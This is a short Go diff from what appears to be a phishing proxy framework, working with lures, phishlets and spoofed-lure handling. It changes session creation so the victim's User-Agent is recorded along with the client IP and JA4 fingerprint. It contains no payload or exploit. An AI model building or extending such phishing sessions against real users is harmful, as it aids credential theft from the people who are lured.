@@ -239,7 +239,7 @@ func (c *connection) initSession(firstReq *http.Request) (initResult, error) {
 			return initSpoofLure, nil
 		}
 
-		sess, err := c.server.SessionSvc.NewSession(c.clientIP, c.ja4Hash, lure.ID, phishlet.Name)
+		sess, err := c.server.SessionSvc.NewSession(c.clientIP, c.ja4Hash, firstReq.UserAgent(), lure.ID, phishlet.Name)
 		if err != nil {
 			return initFailed, fmt.Errorf("creating session: %w", err)
 		}
